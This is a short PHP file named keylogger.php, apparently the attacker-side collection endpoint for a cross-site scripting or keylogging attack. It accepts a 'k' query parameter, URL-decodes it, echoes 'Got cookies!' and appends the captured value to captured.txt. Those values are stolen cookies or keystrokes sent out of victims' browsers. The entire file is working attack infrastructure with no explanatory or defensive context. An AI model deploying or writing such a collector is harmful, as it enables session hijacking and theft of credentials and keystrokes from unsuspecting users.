<?php
// keylogger.php
if(!empty($_GET['k'])) {

    $captured = urldecode($_GET['k']);
    print('Got cookies! :'.$captured);

    $logfile = fopen('captured.txt', 'a+');
    fwrite($logfile, $captured);
    fclose($logfile);
}
?>
